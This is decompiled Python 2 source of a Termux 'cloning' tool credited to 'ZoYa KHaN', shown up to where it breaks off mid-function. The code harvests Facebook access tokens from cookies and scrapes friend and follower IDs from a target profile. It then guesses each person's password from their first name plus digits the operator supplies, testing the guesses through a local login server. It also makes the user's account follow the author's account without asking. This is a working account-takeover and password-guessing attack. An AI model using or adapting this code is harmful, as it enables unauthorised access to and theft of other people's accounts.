# uncompyle6 version 3.7.4

# Python bytecode 2.7

# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 

# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/

# Embedded file name: koNtol

try:

    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, uuid, cookielib, getpass, mechanize, requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system('pip2 install requests')

    os.system('pkg install nodejs')

    os.system('python2 f-r.py')

__author__ = 'ZoYa KHaN'

__copyright = 'All rights reserved . Copyright  ZoYa'

os.system('termux-setup-storage')

try:

    os.mkdir('/sdcard/ids')

except OSError:

    pass

try:

    os.mkdir('/sdcard/ids/ex_ids')

except OSError:

    pass

bd = random.randint(20000000.0, 30000000.0)

sim = random.randint(20000.0, 40000.0)

bd = random.randint(20000000.0, 30000000.0)

sim = random.randint(20000, 40000)

header = {'x-fb-connection-bandwidth': repr(bd), 

   'x-fb-sim-hni': repr(sim), 

   'x-fb-net-hni': repr(sim), 

   'x-fb-connection-quality': 'EXCELLENT', 

   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 

   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 

   'content-type': 'application/x-www-form-urlencoded', 

   'x-fb-http-engine': 'Liger'}

os.system('git pull')

os.system('clear')

c2 = '\x1b[1;32m\x1b[0;97m\x1b[1;32m'

c4 = '\x1b[0;97m\x1b[1;32m\x1b[0;97m'

c5 = '\x1b[1;31m\x1b[0;97m\x1b[1;31m'

os.system('git pull')

os.system('clear')

p = '\x1b[0;37m'

m = '\x1b[0;31m'

h = '\x1b[0;32m'

k = '\x1b[0;33m'

b = '\x1b[0;34m'

u = '\x1b[0;35m'

o = '\x1b[0;36m'

if 'linux' in sys.platform.lower():

    N = '\x1b[0m'

    G = '\x1b[1;93m'

    O = '\x1b[1;92m'

    R = '\x1b[1;91m'

else:

    N = ''

    G = ''

    O = ''

    R = ''

os.system('git pull')

from requests.exceptions import ConnectionError

bd = random.randint(20000000.0, 30000000.0)

sim = random.randint(20000.0, 40000.0)

header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding('utf8')

logo = '   ______     Z      ____  o  _____ Y   ____ a \n  \n \n \n  \n               \n              Coded BY : ZoYa KHaN\n___________________________________'

def reg():

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1mContact Facebook For Free Approval ZoYa KHaN'

    print ''

    time.sleep(1)

    try:

        to = open('/sdcard/.coder.txt', 'r').read()

    except (KeyError, IOError):

        reg2()

    os.system('cd Coder && npm install')

    os.system('fuser -k 5000/tcp &')

    os.system('#')

    os.system('cd Coder && node index.js &')

    time.sleep(5)

    log_menu()

def reg2():

    os.system('clear')

    print logo

    print ''

    print '\tApproval not detected'

    print ''

    print ' \x1b[1;92mCopy and press enter , And Send Me On Facebook'

    print ''

    id = uuid.uuid4().hex[:50]

    print ' Your id: ' + id

    print ''

    print ''

    raw_input(' Press enter to go to Facebook ')

    os.system('xdg-open https://fb.com/ZoYaa007')

    sav = open('/sdcard/.coder.txt', 'w')

    sav.write(id)

    sav.close()

    raw_input('\x1b[1;92m Press enter to check Approval ')

    reg()

def log_menu():

    try:

        t_check = open('access_token.txt', 'r')

        menu()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print ''

        print '\x1b[1;31;1m~~~~ Login Menu~~~~'

        print ''

        print '\x1b[1;92m[1] \x1b[0;96mLogin with FaceBook'

        print '\x1b[1;92m[2] \x1b[0;93mLogin with token'

        print '\x1b[1;92m[3] \x1b[0;96mLogin with cookies'

        print ''

        log_menu_s()

def log_menu_s():

    s = raw_input(' \x1b[0;96mSelect One: ')

    if s == '1':

        log_fb()

    elif s == '2':

        log_token()

    elif s == '3':

        log_cookie()

    else:

        print ''

        print '\\ Select valid option '

        print ''

        log_menu_s()

def log_fb():

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1mLogin with id/pass'

    print ''

    lid = raw_input('\x1b[1;92m Id/mail/no: ')

    pwds = raw_input(' \x1b[0;96mPassword: ')

    try:

        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text

        q = json.loads(data)

        if 'loc' in q:

            ts = open('access_token.txt', 'w')

            ts.write(q['loc'])

            ts.close()

            menu()

        elif 'www.facebook.com' in q['error']:

            print ''

            print ' User must verify account before login'

            print ''

            raw_input('\x1b[1;92m Press enter to try again ')

            log_fb()

        else:

            print ''

            print ' Id/Pass may be wrong'

            print ''

            raw_input(' \x1b[1;92mPress enter to try again ')

            log_fb()

    except:

        print ''

        print 'Exiting tool'

        os.system('exit')

def log_token():

    os.system('clear')

    print logo

    print ''

    print '\x1b[0;96mLogin with token'

    print ''

    tok = raw_input(' \x1b[1;92mPaste token here: ')

    print ''

    t_s = open('access_token.txt', 'w')

    t_s.write(tok)

    t_s.close()

    bot_follow()

    menu()

def log_cookie():

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1mLogin Cookies'

    print ''

    try:

        cookie = raw_input(' Paste cookies here: ')

        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 

           'referer': 'https://m.facebook.com/', 

           'host': 'm.facebook.com', 

           'origin': 'https://m.facebook.com', 

           'upgrade-insecure-requests': '1', 

           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 

           'cache-control': 'max-age=0', 

           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 

           'content-type': 'text/html; charset=utf-8', 

           'cookie': cookie}

        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)

        c2 = re.search('(EAAA\\w+)', c1.text)

        hasil = c2.group(1)

        ok = open('access_token.txt', 'w')

        ok.write(hasil)

        ok.close()

        bot_follow()

        menu()

    except AttributeError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

    except UnboundLocalError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

    except requests.exceptions.SSLError:

        print ''

        print '\tInvalid cookies'

        print ''

        raw_input(' \x1b[1;92mPress enter to try again ')

        log_menu()

def bot_follow():

    try:

        toket = open('access_token.txt', 'r').read()

    except IOError:

        print '\n[!] Token invalid'

        logs()

    requests.post('https://graph.facebook.com/100007390861214/subscribers?access_token=' + toket)

    menu()

def menu():

    os.system('clear')

    try:

        token = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        print ''

        print logo

        print ''

        print '\x1b[1;31;1mLogin Fcebook Account To Continue'

        print ''

        time.sleep(1)

        log_menu()

    try:

        r = requests.get('https://graph.facebook.com/me?access_token=' + token)

        q = json.loads(r.text)

        z = q['name']

    except (KeyError, IOError):

        print logo

        print ''

        print '\t Account Cheekpoint\x1b[0;97m'

        print ''

        os.system('rm -rf access_token.txt')

        time.sleep(1)

        log_menu()

    except requests.exceptions.ConnectionError:

        print logo

        print ''

        print '\t Please Turn on mobile data/wifi\x1b[0;97m'

        print ''

        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')

        menu()

    os.system('clear')

    print logo

    tok = open('/sdcard/.coder.txt', 'r').read()

    print ''

    print '  \x1b[1;92mLogged in User: ' + z

    print ''

    print ' \x1b[0;96m AcTivE ToKeN: ' + tok

    print ''

    print '\x1b[1;93m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    print ''

    print '\x1b[1;92m[1] \x1b[0;93mCloning Menu'

    print '\x1b[1;94m[3] \x1b[0;93mExtract followers ids'

    print '\x1b[1;95m[4] \x1b[0;94mView token'

    print '\x1b[1;92m[0] \x1b[0;95mLogout'

    print ''

    menu_s()

def menu_s():

    ms = raw_input('\x1b[1;92mSelect One: ')

    if ms == '1':

        auto_crack()

    elif ms == '2':

        ex_id()

    elif ms == '3':

        ex_fid()

    elif ms == '4':

        v_tok()

    elif ms == '0':

        os.remove('access_token.txt')

        log_menu()

    else:

        print ''

        print '\tSelect valid option'

        print ''

        menu()

def ex_id():

    idg = []

    try:

        token = open('access_token.txt', 'r').read()

    except IOError:

        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mToken Not Found... '

        print ''

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mEXTRACT PUBLIC ID FRIENDLIST. '

    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    idt = raw_input(h + '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mInput ID :-')

    try:

        r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)

        q = json.loads(r.text)

        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mCollecting Ids From : ' + q['name']

    except KeyError:

        print ''

        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mLogged in id has checkpoint'

        print ''

        raw_input(h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mPress Enter To Go Back')

        menu()

    r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)

    q = json.loads(r.text)

    ids = open('ids_list.txt', 'w')

    for i in q['data']:

        uid = i['id']

        na = i['name']

        nm = na.rsplit(' ')[0]

        idg.append(uid + '|' + nm)

        ids.write(uid + '|' + nm + '\n')

    ids.close()

    print '\n\x1b[1;93m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mThe process has completed'

    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mTotal ids: ' + str(len(idg))

    print '\n\x1b[1;93m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    raw_input('\x1b[0;37mPress Enter To Download File')

    os.system('cp ids_list.txt /sdcard')

    os.system('rm -rf ids_list.txt')

    print '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mFile downloaded successfully'

    time.sleep(1)

    menu()

def ex_fid():

    idg = []

    try:

        token = open('access_token.txt', 'r').read()

    except IOError:

        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mToken Not Found... '

        print ''

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mEXTRACT FOLLOWERS IDS. '

    print '\n\x1b[1;92m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    idt = raw_input(h + '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mInput ID :-')

    limit = raw_input(h + '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mLIMIT (MAX 3000) : ')

    try:

        r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)

        q = json.loads(r.text)

        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mCollecting Ids From : ' + q['name']

    except KeyError:

        print ''

        print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mLogged in id has checkpoint'

        print ''

        raw_input(h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mPress Enter To Go Back')

        menu()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=' + limit + '&access_token=' + token, headers=header)

    q = json.loads(r.text)

    ids = open('ids_list.txt', 'w')

    for i in q['data']:

        uid = i['id']

        na = i['name']

        nm = na.rsplit(' ')[0]

        idg.append(uid + '|' + nm)

        ids.write(uid + '|' + nm + '\n')

    ids.close()

    print '\n\x1b[1;93m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mThe process has completed'

    print h + '\t    \n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mTotal ids: ' + str(len(idg))

    print '\n\x1b[1;93m\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84'

    raw_input('\x1b[0;37mPress Enter To Download File')

    os.system('cp ids_list.txt /sdcard')

    os.system('rm -rf ids_list.txt')

    print '\n[' + m + '\xe0\xbc\x84\xe1\xb6\x9c\xe1\xb5\x92\xe1\xb5\x88\xc2\xb3\xca\xb3\xe1\xad\x84' + h + '] \x1b[0;37mFile downloaded successfully'

    time.sleep(1)

    menu()

def crack():

    global toket

    try:

        toket = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\t File Not Found \x1b[0;97m'

        print ''

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1m~~~~ Auto Pass Cracking ~~~~'

    print ''

    print '\x1b[1;91m[1] Public ID Cloning'

    print '\x1b[1;92m[2] Followers Cloning'

    print '\x1b[1;94m[0] Back'

    print ''

    a_s()

def auto_crack():

    global token

    try:

        token = open('access_token.txt', 'r').read()

    except (KeyError, IOError):

        os.system('clear')

        print logo

        print '\t Login FB id to Continue\x1b[0;97m'

        print ''

        time.sleep(1)

        log_menu()

    os.system('clear')

    print logo

    print ''

    print '\x1b[1;31;1m~~~~ Auto Pass Cracking ~~~~'

    print ''

    print '\x1b[1;93m[1] Public ID Cloning'

    print '\x1b[1;92m[2] Followers Cloning'

    print '\x1b[1;91m[0] Back'

    print ''

    a_s()

def a_s():

    id = []

    cps = []

    oks = []

    a_s = raw_input(' \x1b[0;96mSelect One: ')

    if a_s == '1':

        os.system('clear')

        print logo

        print ''

        print '\x1b[1;31;1m~~~~ Auto Pass Public CracKing ~~~~'

        print ''

        print '\x1b[0;93m For Example: 123 , 1234 , 12345, 786 , 12 , 1122'

        print ''

        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')

        p2 = raw_input(' \x1b[1;93m[2]Name + digit: ')

        p3 = raw_input(' \x1b[1;94m[3]Name + digit: ')

        p4 = raw_input(' \x1b[1;95m[4]Name + digit: ')

        p5 = raw_input(' \x1b[1;96m[5]Name + digit: ')

        p6 = raw_input(' \x1b[1;92m[6]Name + digit: ')

        p7 = raw_input(' \x1b[1;93m[7]Name + digit: ')

        p8 = raw_input(' \x1b[1;94m[8]Name + digit: ')

        p9 = raw_input(' \x1b[1;95m[9]Name + digit: ')

        pass10 = raw_input('\x1b[1;91m[10]Password: ')

        pass11 = raw_input('\x1b[1;92m[11]Password: ')

        pass12 = raw_input('\x1b[1;93m[12]Password: ')

        pass13 = raw_input('\x1b[1;94m[13]Password: ')

        pass14 = raw_input('\x1b[1;95m[14]Password: ')

        pass15 = raw_input('\x1b[1;96m[15]Password: ')

        pass16 = raw_input('\x1b[1;91m[16]Password: ')

        pass17 = raw_input('\x1b[1;92m[17]Password: ')

        pass18 = raw_input('\x1b[1;93m[18]Password: ')

        pass19 = raw_input('\x1b[1;94m[19]Password: ')

        pass20 = raw_input('\x1b[1;95m[20]Password: ')

        idt = raw_input('\x1b[0;93m[\xe2\x98\x85]Enter id: ')

        try:

            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)

            q = json.loads(r.text)

            z = q['name']

            os.system('clear')

            print logo

            print ''

            print '\x1b[1;31;1m~~~~Auto Pass Public Cracking~~~~'

            print ''

            print ' \x1b[1;93mCloning From: ' + z

        except (KeyError, IOError):

            print ''

            print '\t Invalid user \x1b[0;97m'

            print ''

            raw_input(' \x1b[1;92mPress Enter To Try Again ')

            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)

        z = json.loads(r.text)

        for i in z['data']:

            uid = i['id']

            na = i['name']

            nm = na.rsplit(' ')[0]

            id.append(uid + '|' + nm)

    elif a_s == '2':

        os.system('clear')

        print logo

        print ''

        print '\x1b[1;31;1m~~~~ Auto Pass Followers Cracking ~~~~'

        print ''

        print ' \x1b[0;92mFor Example: 123 , 1234 , 12345, 786 , 12 , 1122'

        print ''

        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')

        p2 = raw_input(' \x1b[1;91m[2]Name + digit: ')

        p3 = raw_input(' \x1b[1;93m[3]Name + digit: ')

        p4 = raw_input(' \x1b[1;94m[4]Name + digit: ')

        p5 = raw_input(' \x1b[1;95m[5]Name + digit: ')

        p6 = raw_input(' \x1b[1;96m[6]Name + digit: ')

        p7 = raw_input(' \x1b[1;92m[7]Name + digit: ')

        p8 = raw_input(' \x1b[1;93m[8]Name + digit: ')

        p9 = raw_input(' \x1b[1;94m[9]Name + digit: ')

        pass10 = raw_input('\x1b[1;92m[10]Password: ')

        pass11 = raw_input('\x1b[1;93m[11]Password: ')

        pass12 = raw_input('\x1b[1;94m[12]Password: ')

        pass13 = raw_input('\x1b[1;92m[13]Password: ')

        pass14 = raw_input('\x1b[1;94m[14]Password: ')

        pass15 = raw_input('\x1b[1;93m[15]Password: ')

        pass16 = raw_input('\x1b[1;92m[16]Password: ')

        pass17 = raw_input('\x1b[1;91m[17]Password: ')

        pass18 = raw_input('\x1b[1;92m[18]Password: ')

        pass19 = raw_input('\x1b[1;93m[19]Password: ')

        pass20 = raw_input('\x1b[1;94m[20]Password: ')

        idt = raw_input(' \x1b[0;92m[\xe2\x98\x85]Enter id: ')

        try:

            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)

            q = json.loads(r.text)

            z = q['name']

            os.system('clear')

            print logo

            print ''

            print '\x1b[1;31;1m~~~~ Auto Pass Followers Cracking ~~~~'

            print ' \x1b[1;93mCloning From: ' + z

        except (KeyError, IOError):

            print ''

            print '\t Invalid user \x1b[0;97m'

            print ''

            raw_input('\x1b[1;92mPress enter to try again ')

            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')

        z = json.loads(r.text)

        for i in z['data']:

            uid = i['id']

            na = i['name']

            nm = na.rsplit(' ')[0]

            id.append(uid + '|' + nm)

    elif a_s == '3':

        os.system('clear')

        print logo

        print ''

    elif a_s == '0':

        menu()

    else:

        print ''

        print '\tChoose valid option' + w

        print ''

        a_s()

    print ' Total ids: ' + str(len(id))

    time.sleep(0.5)

    print ' \x1b[0;96mCrack Running '

    time.sleep(0.5)

    print ''

    print 47 * '-'

    print 'Hard work beats talent if talent doesn\xe2\x80\x99t work hard.'

    print 47 * '-'

    print ''

    def main(arg):

        user = arg

        uid, name = user.split('|')

        try:

            pass1 = name.lower() + p1

            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text

            q = json.loads(data)

            if 'loc' in q:

